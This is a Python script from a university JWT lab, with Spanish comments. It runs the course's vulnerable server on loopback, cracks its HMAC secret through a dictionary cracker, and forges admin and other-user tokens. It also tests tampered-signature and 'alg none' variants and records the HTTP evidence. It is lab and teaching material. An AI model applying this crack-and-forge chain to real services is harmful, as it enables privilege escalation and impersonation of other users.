#!/usr/bin/env python3
"""Reproduce el caso de la cátedra en loopback y conserva salidas originales.

No acepta un objetivo externo, no modifica el servidor ni lee su secreto.
Carga su Handler original para servir HTTP en 127.0.0.1 con puerto libre.
La clave usada se obtiene exclusivamente ejecutando el cracker del grupo.
Cada ejecución exige un directorio nuevo, para no pisar evidencia anterior.
"""
import argparse
from datetime import datetime, timezone
import hashlib
from http.client import HTTPConnection
from http.server import ThreadingHTTPServer
import importlib.util
import json
from pathlib import Path
import platform
import subprocess
import sys
import threading


GRUPO = Path(__file__).resolve().parents[1]
RAIZ = GRUPO.parents[2]
sys.path.insert(0, str(GRUPO))
import jwt_tool as jwt


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--salida", type=Path, required=True)
    args = parser.parse_args()
    salida = args.salida.resolve()
    salida.mkdir(parents=True, exist_ok=False)
    log = (salida / "comandos.txt").open("x", encoding="utf-8")

    def registrar(texto):
        log.write(texto + "\n")
        log.flush()

    def cli(nombre, *argumentos):
        comando = [sys.executable, "-X", "utf8", str(GRUPO / "jwt_tool.py"), *argumentos]
        registrar(subprocess.list2cmdline(comando) + f" > {nombre}.txt 2> {nombre}.stderr.txt")
        with (salida / f"{nombre}.txt").open("xb") as stdout:
            with (salida / f"{nombre}.stderr.txt").open("xb") as stderr:
                subprocess.run(comando, stdout=stdout, stderr=stderr, check=True)
        return (salida / f"{nombre}.txt").read_text(encoding="utf-8").strip()

    objetivo = RAIZ / "labs/labextra5-jwt/objetivo/server.py"
    spec = importlib.util.spec_from_file_location("objetivo_jwt_local", objetivo)
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    servidor = ThreadingHTTPServer(("127.0.0.1", 0), modulo.Handler)
    hilo = threading.Thread(target=servidor.serve_forever, daemon=True)
    hilo.start()
    puerto = servidor.server_address[1]
    metadatos = {
        "inicio_utc": datetime.now(timezone.utc).isoformat(),
        "python": sys.version, "sistema": platform.platform(),
        "objetivo": str(objetivo.relative_to(RAIZ)),
        "sha256_objetivo": hashlib.sha256(objetivo.read_bytes()).hexdigest(),
        "base_url": f"http://127.0.0.1:{puerto}",
        "procedencia": "Ejecución automatizada asistida por OpenCode; no acredita revisión humana.",
    }
    (salida / "00-entorno.json").write_text(json.dumps(metadatos, indent=2), encoding="utf-8")
    registrar("# HTTP real contra el Handler original, sin modificarlo; puerto efímero en loopback.")
    registrar(f"{sys.executable} -X utf8 -m unittest discover -s entregas/labextra5/grupo10 -p test_*.py -v > evidencia/pruebas-unitarias.txt 2>&1")
    registrar(f"python -X utf8 {Path(__file__).resolve().relative_to(RAIZ)} --salida {salida.relative_to(RAIZ)}")

    def pedir(nombre, ruta, token=None):
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        registrar(f"# HTTPConnection: GET http://127.0.0.1:{puerto}{ruta}")
        if token:
            registrar(f"# Authorization: Bearer {token}")
        conexion = HTTPConnection("127.0.0.1", puerto, timeout=5)
        try:
            conexion.request("GET", ruta, headers=headers)
            respuesta = conexion.getresponse()
            cuerpo = respuesta.read()
            with (salida / f"{nombre}.http.txt").open("xb") as archivo:
                archivo.write(f"HTTP/1.0 {respuesta.status} {respuesta.reason}\r\n".encode())
                for clave, valor in respuesta.getheaders():
                    archivo.write(f"{clave}: {valor}\r\n".encode("latin-1"))
                archivo.write(b"\r\n" + cuerpo)
            return respuesta.status, json.loads(cuerpo)
        finally:
            conexion.close()

    try:
        codigo, login = pedir("01-login", "/login?user=diego&pass=diego123")
        assert codigo == 200, codigo
        token = login["token"]
        (salida / "02-token-original.txt").write_text(token + "\n", encoding="utf-8")
        cli("03-decodificado", "decodificar", token)
        # Esta CLI es un proceso separado que solo lee token y diccionario.
        crack = cli("04-crack", "crackear", token,
                    str(RAIZ / "labs/labextra5-jwt/caso/diccionario.txt"))
        assert crack.startswith("SECRETO: "), crack
        secreto = crack.removeprefix("SECRETO: ")
        admin = cli("05-token-admin", "forjar", secreto, "--sub", "diego", "--role", "admin")
        codigo, datos_admin = pedir("06-admin", "/admin", admin)
        assert codigo == 200, codigo
        maria = cli("07-token-maria", "forjar", secreto, "--sub", "maria", "--role", "user")
        codigo, datos_maria = pedir("08-perfil-maria", "/perfil", maria)
        assert codigo == 200 and datos_maria["usuario"] == "maria", codigo
        codigo, _ = pedir("09-original-en-admin", "/admin", token)
        assert codigo == 403, codigo
        cab, pay, fir = admin.split(".")
        alterado = f"{cab}.{pay}." + ("A" if fir[0] != "A" else "B") + fir[1:]
        (salida / "10-token-alterado.txt").write_text(alterado + "\n", encoding="utf-8")
        assert sum(a != b for a, b in zip(admin, alterado)) == 1
        codigo, _ = pedir("11-firma-alterada", "/admin", alterado)
        assert codigo == 401, codigo
        none = jwt.b64url(b'{"alg":"none","typ":"JWT"}') + f".{pay}."
        (salida / "12-token-none.txt").write_text(none + "\n", encoding="utf-8")
        codigo, _ = pedir("13-none", "/admin", none)
        assert codigo == 401, codigo
        # Control adicional: este servidor ignora el header alg, aunque no
        # acepta una firma vacía. No confundir ambas propiedades.
        mensaje = none.rsplit(".", 1)[0]
        import hmac
        firma = hmac.new(secreto.encode(), mensaje.encode(), hashlib.sha256).digest()
        none_con_hmac = f"{mensaje}.{jwt.b64url(firma)}"
        (salida / "14-none-con-hmac.txt").write_text(none_con_hmac + "\n", encoding="utf-8")
        codigo, _ = pedir("15-none-con-hmac", "/admin", none_con_hmac)
        assert codigo == 200, codigo
        resumen = {
            "R1": jwt.decodificar(token)[1]["nota_interna"].split()[-1],
            "R2": datos_admin["auditoria"],
            "R3": datos_maria["datos"].split()[-1],
            "resultados_http": {"R2": 200, "R3": 200, "original_admin": 403,
                               "firma_alterada": 401, "none_vacio": 401,
                               "none_con_hmac": 200},
        }
        (salida / "16-resumen.json").write_text(json.dumps(resumen, indent=2), encoding="utf-8")
        print(json.dumps({"salida": str(salida), **resumen}, indent=2))
    finally:
        servidor.shutdown()
        servidor.server_close()
        hilo.join(timeout=5)
        log.close()


if __name__ == "__main__":
    main()
